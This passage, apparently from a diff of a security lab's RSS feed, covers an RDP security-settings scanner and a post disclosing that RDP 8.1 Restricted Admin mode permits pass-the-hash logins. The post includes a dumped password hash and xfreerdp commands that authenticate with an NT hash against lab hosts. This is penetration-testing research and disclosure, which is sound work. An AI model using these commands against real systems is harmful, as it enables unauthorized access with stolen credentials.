+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported
+
+[+] Summary of protocol support
+
+[-] 10.0.0.21:3389 supports PROTOCOL_RDP   : FALSE
+[-] 10.0.0.21:3389 supports PROTOCOL_HYBRID: TRUE
+[-] 10.0.0.21:3389 supports PROTOCOL_SSL   : FALSE
+
+[+] Summary of RDP encryption support
+
+[-] 10.0.0.21:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
+[-] 10.0.0.21:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
+[-] 10.0.0.21:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
+[-] 10.0.0.21:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
+[-] 10.0.0.21:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE
+
+[+] Summary of security issues
+
+rdp-sec-check v0.8-beta completed at Mon Jul  9 13:32:31 2012
+</pre>
+<p>The latest version of the code will be maintained on <a href="https://github.com/portcullislabs/rdp-sec-check">github</a>. Older versions are available below.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/tools/rdp-sec-check/">rdp-sec-check</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/tools/rdp-sec-check/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Checking RDP support across an internal network</title>
+		<link>https://labs.portcullis.co.uk/blog/checking-rdp-across-an-internal-network/</link>
+		<comments>https://labs.portcullis.co.uk/blog/checking-rdp-across-an-internal-network/#comments</comments>
+		<pubDate>Mon, 10 Feb 2014 06:32:00 +0000</pubDate>
+		<dc:creator><![CDATA[BRC]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=3051</guid>
+		<description><![CDATA[<p>We&#8217;ve recently added some new features to rdp-sec-check, which is a Perl script to enumerate security settings of an RDP Service (AKA Terminal Services). The tool download is available in the rdp-sec-check page. The following new features were added to rdp-sec-check: Support for targets file Support for saving the tool output to a specified logfile [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/checking-rdp-across-an-internal-network/">Checking RDP support across an internal network</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>We&#8217;ve recently added some new features to <a title="rdp-sec-check" href="https://labs.portcullis.co.uk/tools/rdp-sec-check/">rdp-sec-check</a>, which is a Perl script to enumerate security settings of an RDP Service (AKA Terminal Services). The tool download is available in the <a title="rdp-sec-check" href="https://labs.portcullis.co.uk/tools/rdp-sec-check/">rdp-sec-check</a> page.<span id="more-3051"></span></p>
+<p>The following new features were added to rdp-sec-check:</p>
+<ul>
+<li>Support for targets file</li>
+<li>Support for saving the tool output to a specified logfile</li>
+<li>Control over the connection and responses timeouts</li>
+<li>Control over the number of retries when timeouts occurs</li>
+</ul>
+<h2>rdp-sec-check command line help</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ rdp-sec-check.pl
+Starting rdp-sec-check v0.9-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ )
+Copyright (C) 2014 Mark Lowe (mrl@portcullis-security.com)
+
+/usr/local/bin/rdp-sec-check.pl [ options ]  ( --file hosts.txt | host | host:port )
+
+options are:
+
+  --file hosts.txt	targets, one ip:port per line
+  --outfile out.log	output logfile
+  --timeout sec		receive timeout (default 10s)
+  --retries times	number of retries after timeout
+  --verbose
+  --debug
+  --help
+
+Example:
+         /usr/local/bin/rdp-sec-check.pl 192.168.1.1
+         /usr/local/bin/rdp-sec-check.pl --file hosts.txt --timeout 15 --retries 3
+         /usr/local/bin/rdp-sec-check.pl --outfile rdp.log 192.168.69.69:3389
+         /usr/local/bin/rdp-sec-check.pl --file hosts.txt --outfile rdp.log --verbose
+
+</pre>
+<h2>Example output: A single Windows 2003 R2 RDP service scan</h2>
+<p>The following is an example of a single machine scan using 3 seconds as timeout for connections and responses and output saving using the file named out.log:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./rdp-sec-check.pl --outfile out.log --timeout 3 192.168.13.13
+Starting rdp-sec-check v0.9-beta ( https://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Thu Jan 23 12:16:26 2014
+
+[+] Scanning 1 hosts
+
+Target:    192.168.13.13
+IP:        192.168.13.13
+Port:      3389
+
+[+] Checking supported protocols
+
+[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Supported
+[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - SSL_CERT_NOT_ON_SERVER
+[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Not supported - SSL_CERT_NOT_ON_SERVER
+
+[+] Checking RDP Security Layer
+
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Supported.  Server encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+
+[+] Summary of protocol support
+
+[-] 192.168.13.13:3389 supports PROTOCOL_RDP   : TRUE
+[-] 192.168.13.13:3389 supports PROTOCOL_SSL   : FALSE
+[-] 192.168.13.13:3389 supports PROTOCOL_HYBRID: FALSE
+
+[+] Summary of RDP encryption support
+
+[-] 192.168.13.13:3389 has encryption level: ENCRYPTION_LEVEL_CLIENT_COMPATIBLE
+[-] 192.168.13.13:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
+[-] 192.168.13.13:3389 supports ENCRYPTION_METHOD_40BIT  : TRUE
+[-] 192.168.13.13:3389 supports ENCRYPTION_METHOD_128BIT : TRUE
+[-] 192.168.13.13:3389 supports ENCRYPTION_METHOD_56BIT  : TRUE
+[-] 192.168.13.13:3389 supports ENCRYPTION_METHOD_FIPS   : TRUE
+
+[+] Summary of security issues
+
+[-] 192.168.13.13:3389 has issue FIPS_SUPPORTED_BUT_NOT_MANDATED
+[-] 192.168.13.13:3389 has issue WEAK_RDP_ENCRYPTION_SUPPORTED
+[-] 192.168.13.13:3389 has issue ONLY_RDP_SUPPORTED_MITM
+[-] 192.168.13.13:3389 has issue NLA_NOT_SUPPORTED_DOS
+
+rdp-sec-check v0.9-beta completed at Thu Jan 23 12:16:27 2014
+</pre>
+<h2>Example: A fast network scan using timeouts and retries</h2>
+<p>In this example, a targets file to test the network 172.18.19.0/24 is generated using a shell one liner:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ for i in $(seq 1 254); do echo 172.18.19.$i; done &gt;&gt; targets.txt
+</pre>
+<p>Then rdp-sec-check is fed with the targets file targets.txt and a 3 second limit is set on the connections and responses; if the connections times out, rdp-sec-check will retry 2 times before exiting. Finally, the scan log will be saved in the file out.log.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./rdp-sec-check.pl --file targets.txt --outfile out.log --timeout 3 --retries 2
+</pre>
+<p>In this example, the timeout and retries parameters are set for a fast local network scan. When scanning machines through the Internet or VPN, the timeout should be set to a higher value. Also, depending on the stability of the targets and/or the pentester&#8217;s Internet connection, the value of the parameter retries should be tuned.</p>
+<h2>Example: A Internet network scan using timeouts and retries</h2>
+<p>In this example, I have configured rdp-sec-check with a targets file named targets.txt and a 15 seconds time limit on the connections and responses (with a fault tolerance of 5). Again, all the output will be saved in the file named out.log. This parameter settings should help rdp-sec-check to succeed where the network connectivity is unreliable: </p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ ./rdp-sec-check.pl --file targets.txt --outfile out.log --timeout 15 --retries 5
+</pre>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/checking-rdp-across-an-internal-network/">Checking RDP support across an internal network</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/checking-rdp-across-an-internal-network/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>FreeRDP-pth</title>
+		<link>https://labs.portcullis.co.uk/tools/freerdp-pth/</link>
+		<comments>https://labs.portcullis.co.uk/tools/freerdp-pth/#comments</comments>
+		<pubDate>Sun, 20 Oct 2013 16:57:04 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Tools]]></category>
+		<category><![CDATA[pass-the-hash]]></category>
+		<category><![CDATA[RDP]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2093</guid>
+		<description><![CDATA[<p>FreeRDP-pth is a slightly modified version of FreeRDP that tries to authenticate using a password hash instead of a password.  This work only against RDP v8.1 servers (Windows 2012 R2 at the time of writing) and even then, only for members of the administrators groups. Refer to companion blog post for more information about Restricted [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/tools/freerdp-pth/">FreeRDP-pth</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>FreeRDP-pth is a slightly modified version of <a href="https://github.com/FreeRDP/FreeRDP">FreeRDP</a> that tries to authenticate using a password hash instead of a password.  This work only against RDP v8.1 servers (Windows 2012 R2 at the time of writing) and even then, only for members of the administrators groups.<span id="more-2093"></span></p>
+<p>Refer to <a href="/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/">companion blog post</a> for more information about Restricted Mode and pass-the-hash.</p>
+<h2>Unpack like this:</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ tar cfz FreeRDP-pth.tar.gz
+$ cd FreeRDP
+</pre>
+<h2>Attempt to run without recompiling like this:</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ client/X11/xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129
+</pre>
+<p>(that&#8217;s the NT hash in the -p arg).</p>
+<h2>Recompile like this:</h2>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ sh cmake.sh
+$ make
+</pre>
+<p>If you run into compilation problems, check out the <a href="https://github.com/FreeRDP/FreeRDP/wiki/Compilation">excellent instructions on the FreeRDP site</a>. Tested on Ubuntu 12.04.</p>
+<h2>When it works&#8230;</h2>
+<p>You&#8217;ll get a normal RDP session.  The command line is shown right at the bottom of the screenshot.</p>
+<p><a name="imageclose-2094"><div class="lb-album"><a href="#image-2094"><img src="/wp-content/uploads/2013/10/login-300x217.jpg" alt="login" class="alignnone size-medium wp-image-2086"><span></span></a></div>              
+<a href="#imageclose-2094" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2094">
+                   <img src="/uploads/2013/10/login.jpg" alt="image-2094">
+                   </div></a></p>
+<h2>Update 7th Nov 2013</h2>
+<p>Marc-André Moreau, the founder and leader of the FreeRDP project contact us to let us know about <a href="https://github.com/awakecoding/FreeRDP/commit/b8a1f7d6c08bfcc69e000e062a63d46488e9d251">some</a> <a href="https://github.com/awakecoding/FreeRDP/commit/a3d0e271b564cd346ee59c998ed8cbe13cb4399f">updates</a> he made to to add clean support for Restricted Admin mode. At the time of writing this work works on non-windows platforms only. We tested it on Ubuntu 12.04.</p>
+<p>We downloaded like this:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ git clone https://github.com/awakecoding/FreeRDP.git
+</pre>
+<p>Then followed the <a href="https://github.com/FreeRDP/FreeRDP/wiki/Compilation">compilation instructions</a>.</p>
+<p>The new version of FreeRDP then worked against our Windows 2012 R2 server with either a password or password hash. Remember this only works for Windows 2012 R2 and only for local administrator accounts.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+/FreeRDP/client/X11$ ./xfreerdp /u:test /p:Portcullis1 /v:192.168.226.128
+/FreeRDP/client/X11$ ./xfreerdp /restricted-admin /u:test /pth:36374BD2767773A2DD4F6B010EC5EE0D /v:192.168.226.128
+</pre>
+<p>The pentest community thanks you, Marc-André. <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-2').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz" target="_blank" title="Download FreeRDP-pth Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="FreeRDP-pth Tar" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz" title="Download FreeRDP-pth.tar.gz" target="_blank" id="wpfb-file-link-2">FreeRDP-pth.tar.gz</a>
+    
+    <br />
+    November 11, 2013<br />
+    
+  </div>
+  <div class="info">
+    30.9 MiB<br />
+    MD5 hash: e2437ab11b49b7e22e26f43bc68c7d26 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(2);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails2" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>November 11, 2013</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-3').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.diff" target="_blank" title="Download FreeRDP-pth"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/default.png" alt="FreeRDP-pth" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.diff" title="Download FreeRDP-pth.diff" target="_blank" id="wpfb-file-link-3">FreeRDP-pth.diff</a>
+    
+    <br />
+    November 11, 2013<br />
+    
+  </div>
+  <div class="info">
+    6.3 KiB<br />
+    MD5 hash: ae203a288c231432b246093f40dfc608 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(3);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails3" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>November 11, 2013</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/tools/freerdp-pth/">FreeRDP-pth</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/tools/freerdp-pth/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>New &#8220;Restricted Admin&#8221; feature of RDP 8.1 allows pass-the-hash</title>
+		<link>https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/</link>
+		<comments>https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/#comments</comments>
+		<pubDate>Sun, 20 Oct 2013 16:46:19 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[pass-the-hash]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=2083</guid>
+		<description><![CDATA[<p>Windows 2012 R2 servers use a newer version of the Remote Desktop Protocol (RDP) that has a feature that will be interest to both penetration testers and system administrators.  This post describes the new &#8220;Restricted Admin&#8221; feature, the security benefits it brings and a potential downside of the feature: Pass-the-Hash attacks.  We&#8217;ll briefly recap what [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/">New &#8220;Restricted Admin&#8221; feature of RDP 8.1 allows pass-the-hash</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p><a href="http://www.microsoft.com/en-us/server-cloud/products/windows-server-2012-r2/default.aspx">Windows 2012 R2</a> servers use a newer version of the Remote Desktop Protocol (RDP) that has a feature that will be interest to both penetration testers and system administrators.  This post describes the new &#8220;<a href="http://blogs.technet.com/b/kfalde/archive/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2.aspx">Restricted Admin</a>&#8221; feature, the security benefits it brings and a potential downside of the feature: Pass-the-Hash attacks.  We&#8217;ll briefly recap what Pass-the-Hash attack are and demonstrate such an attack against a Windows 2012 R2 server. A <a href="/tools/freerdp-pth/">proof-of-concept (PoC) tool</a> to carry out Pass-the-Hash attacks against Windows 2012 R2 server is also released &#8211; a trivial modification to the excellent <a href="http://www.freerdp.com/">FreeRDP </a>client.<span id="more-2083"></span></p>
+<h2>What are pass-the-hash attacks?</h2>
+<p>Quite simply, <a href="http://en.wikipedia.org/wiki/Pass_the_hash">Pass-the-Hash</a> involves a user logging in using a username and password <a href="http://en.wikipedia.org/wiki/Cryptographic_hash_function">hash</a> instead of a username and password. Invariably the &#8220;user&#8221; is an attacker or pentester &#8211; it&#8217;s easier for legitimate users to just use their password. Many windows protocols require the user to know their password hash, but not necessarily to know their password. This is important during penetration testing as it is normally easier to discover a user&#8217;s password hash than it is to discover their password.</p>
+<p>Prior to version 8.1, RDP required users to know their password. For the most part version 8.1 still requires used to know their password. However there is a corner case (Restricted Admin Mode) where the user can authenticate using their password hash instead.</p>
+<p><a href="http://www.microsoft.com/en-gb/download/details.aspx?id=36036">Microsoft has release guidance about how to mitigate</a> against Pass-the-Hash attacks.</p>
+<h2>What is Restricted Admin mode?</h2>
+<p>Running &#8220;mstsc /?&#8221; on Windows 2012 R2 gives the following description of the <a href="http://blogs.technet.com/b/kfalde/archive/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2.aspx">Restricted Admin</a> mode feature:</p>
+<p><a name="imageclose-2084"><div class="lb-album"><a href="#image-2084"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/ra-300x52.jpg" alt="ra" class="alignnone  wp-image-2084"><span></span></a></div>              
+<a href="#imageclose-2084" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2084">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/ra.jpg" alt="image-2084">
+                   </div></a></p>
+<p>So, in short the efficacy of tools such <a href="http://blog.gentilkiwi.com/mimikatz">mimikatz</a> (which recovers the cleartext passwords of logged-in users) should be reduced in environments where the &#8220;Restricted Admin&#8221; option is used.  I haven&#8217;t looked into the effect of &#8220;Restricted Admin&#8221; mode on post-exploitation tools.  This may make a good topic for a future post.</p>
+<p>On the face of it then, Administrators would be well advised to use this new feature in 2012 R2 environments. The downside is that outbound connection from the RDP session (e.g. mapping shares) won&#8217;t work. The feature would therefore be most useful when to connecting to individual servers, but not when connection to Jump Servers.</p>
+<h2>RDP Protocol 8.1</h2>
+<p>The <a href="http://msdn.microsoft.com/en-us/library/cc240445.aspx">RDP v8.1 Protocol specification</a> is dated July 22nd 2013.  You can tell if your client supports v8.1 using the &#8220;About&#8221; dialogue:</p>
+<p><a name="imageclose-2085"><div class="lb-album"><a href="#image-2085"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/81-300x185.jpg" alt="81" class="alignnone size-medium wp-image-2085"><span></span></a></div>              
+<a href="#imageclose-2085" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2085">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/81.jpg" alt="image-2085">
+                   </div></a></p>
+<p>I&#8217;ll briefly summarise the new parts of the protocol that interest us to save the reader having to navigate 464 pages.</p>
+<ol>
+<li>At the bottom of page 37 of the PDF we see the new RESTRICTED_ADMIN_MODE_REQUIRED flag that can be sent by the RDP client. We&#8217;ll want to send this in our <a href="/tools/freerdp-pth/">PoC tool</a></li>
+<li>Also on page 37, we read &#8220;If the server supports this mode then it is acceptable for the client to send empty credentials in the TSPasswordCreds structure defined in [MS-CSSP] section 2.2.1.2.1.&#8221;. So our <a href="/tools/freerdp-pth/">PoC </a>needs to send a null domain, null username and null password to the server in the TSPasswordCreds structure</li>
+</ol>
+<p>That&#8217;s it.</p>
+<h2>Proof of concept: Scenario</h2>
+<p>Imagine we&#8217;re performing a penetration test of network. We wish to log into a particular Windows 2012 R2 Server over RDP. Let&#8217;s further imagine that it&#8217;s a standalone system with a host-based Firewall that only allows RDP access &#8211; this will make the PoC more compelling <img src="https://labs.portcullis.co.uk/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
+<p>Elsewhere on the network we compromise a server and run <a href="http://foofus.net/goons/fizzgig/fgdump/">fgdump </a>(or similar). We find the following username and password hash:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+test:1001:NO PASSWORD*********************:36374BD2767773A2DD4F6B010EC5EE0D:::
+</pre>
+<p>Finally, let&#8217;s imagine that that password is really strong and we can&#8217;t crack it. Traditionally, we&#8217;d be unable to determine if the same &#8220;test&#8221; account was valid on the target server. However, in Windows 2012 R2, we can pass-the-hash &#8211; i.e. authenticate with a username and password hash.</p>
+<h2>Proof of concept: Logging in using a password hash instead of a password</h2>
+<p>The <a href="https://github.com/FreeRDP/FreeRDP">latest version of the FreeRDP project</a> was used for the PoC pass-the-hash RDP client. This is an excellent project released under the Apache Licence v2.0. The RDP client supports most of the newer features that we&#8217;ll need &#8211; in particular it supports SSL and CredSSP (NLA). We just need to make a few small modifications as outlined above to support &#8220;Restricted Admin&#8221; mode.</p>
+<p>RDP connection are normally made like this:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ xfreerdp -u test -p Portcullis1 192.168.226.129
+</pre>
+<p>In the modified version of FreeRDP, the meaning of the -p option has been changed to be the password hash:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129
+</pre>
+<p>The image below shows that we can log in. Right at the bottom of the image is the command line we used to log in.<br />
+<a name="imageclose-2086"><div class="lb-album"><a href="#image-2086"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/login-300x217.jpg" alt="login" class="alignnone size-medium wp-image-2086"><span></span></a></div>              
+<a href="#imageclose-2086" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2086">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/login.jpg" alt="image-2086">
+                   </div></a></p>
+<p>That&#8217;s it. It&#8217;s pretty straight forward, but should prove useful on pentests when Windows 2012 R2 becomes commonplace.</p>
+<h2>Limitations</h2>
+<p>The Restricted Admin mode only applies to administrators.  If your target user is in the &#8220;Remote Desktop Users&#8221; group, the above method won&#8217;t work. You&#8217;ll get the following message:</p>
+<p><a name="imageclose-2087"><div class="lb-album"><a href="#image-2087"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/fail-300x229.jpg" alt="fail" class="alignnone size-medium wp-image-2087"><span></span></a></div>              
+<a href="#imageclose-2087" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-2087">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/10/fail.jpg" alt="image-2087">
+                   </div></a></p>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-4').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz" target="_blank" title="Download FreeRDP-pth Tar"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/archive.png" alt="FreeRDP-pth Tar" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.tar.gz" title="Download FreeRDP-pth.tar.gz" target="_blank" id="wpfb-file-link-4">FreeRDP-pth.tar.gz</a>
+    
+    <br />
+    November 11, 2013<br />
+    
+  </div>
+  <div class="info">
+    30.9 MiB<br />
+    MD5 hash: e2437ab11b49b7e22e26f43bc68c7d26 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(4);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails4" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>November 11, 2013</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-5').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.diff" target="_blank" title="Download FreeRDP-pth"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/default.png" alt="FreeRDP-pth" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/FreeRDP-pth.diff" title="Download FreeRDP-pth.diff" target="_blank" id="wpfb-file-link-5">FreeRDP-pth.diff</a>
+    
+    <br />
+    November 11, 2013<br />
+    
+  </div>
+  <div class="info">
+    6.3 KiB<br />
+    MD5 hash: ae203a288c231432b246093f40dfc608 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(5);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails5" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>November 11, 2013</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/">New &#8220;Restricted Admin&#8221; feature of RDP 8.1 allows pass-the-hash</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
